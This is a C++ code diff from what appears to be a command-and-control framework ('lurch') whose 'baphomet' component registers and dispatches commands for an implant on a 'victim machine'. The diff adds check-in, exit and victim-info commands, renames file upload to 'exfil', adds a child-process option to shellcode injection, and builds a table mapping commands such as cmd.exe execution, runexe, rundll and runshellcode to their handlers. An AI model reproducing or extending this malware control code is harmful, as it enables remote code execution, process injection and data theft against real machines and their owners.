@@ -6,12 +6,17 @@
 
 namespace lurch {
     accepted_commands baphomet::commands;
+    std::unordered_map<std::string, std::function<result<std::string>(baphomet*, reciever_context&)>> baphomet::callables;
 }
 
 void
 lurch::baphomet::init_commands() {
 
     if(!commands.ready()) {
+
+        //
+        // init accepted commands
+        //
 
         commands.add_command("pwd", "prints the working directory of the implant");
         commands.add_command("ls", "displays files in the working directory");
@@ -23,7 +28,10 @@ lurch::baphomet::init_commands() {
         commands.add_command("die", "tells the running agent to exit.");
         commands.add_command("staged", "display staged files that can be downloaded by the agent.");
         commands.add_command("clear_tasks", "clear all currently assigned tasks.");
+        commands.add_command("indicate_exit", "Used by the agent to indicate that it is exiting.");
+        commands.add_command("checkin", "Used by the agent to indicate it has connected.");
         commands.add_command("help", "display this help message and exit.");
+        commands.add_command("getinfo", "retrieves basic info about the victim machine.");
 
         commands.add_command("cd", "changes the working directory")
             .arg<std::string>("--directory", "-d", true);
@@ -47,7 +55,7 @@ lurch::baphomet::init_commands() {
         commands.add_command("cmd", "executes a shell command (cmd.exe) and returns the output")
             .arg<std::string>("--command", "-c", true);
 
-        commands.add_command("upload", "exfiltrates a file")
+        commands.add_command("exfil", "exfiltrates a file")
             .arg<std::string>("--directory-entry", "-de", true);
 
         commands.add_command("runexe", "runs an executable file on the victim machine")
@@ -63,6 +71,7 @@ lurch::baphomet::init_commands() {
 
         commands.add_command("runshellcode", "loads shellcode into memory and executes it")
             .arg<std::string>("--staged-file", "-sf", true)
+            .arg<empty>("--child", "-c", false)
             .arg<empty>("--local", "-l", false)
             .arg<int64_t>("--pid", "-p", false);
 
@@ -70,5 +79,32 @@ lurch::baphomet::init_commands() {
             .arg<std::string>("--result", "-r", true);
 
         commands.done();
+
+        //
+        // init callables
+        //
+
+        callables =
+        {
+            {"checkin",       &baphomet::checkin},
+            {"indicate_exit", &baphomet::indicate_exit},
+            {"cat",         &baphomet::cat},
+            {"cd",          &baphomet::cd},
+            {"mkdir",       &baphomet::mkdir},
+            {"rm",          &baphomet::rm},
+            {"cp",          &baphomet::cp},
+            {"ps",          &baphomet::ps},
+            {"cmd",         &baphomet::cmd},
+            {"exfil",      &baphomet::exfil},
+            {"runexe",      &baphomet::runexe},
+            {"rundll",      &baphomet::rundll},
+            {"runshellcode", &baphomet::runshellcode},
+            {"complete_task", &baphomet::complete_task},
+            {"get_task",      &baphomet::get_task},
+            {"tasks",       [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_tasks(); }},
+            {"staged",      [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_staged_files(); }},
+            {"clear_tasks", [](baphomet*  ptr, reciever_context& ctx) { return ptr->clear_tasks(); }},
+            {"help",        [&](baphomet* ptr, reciever_context& ctx) { return baphomet::commands.help(); }}
+        };
     }
 }
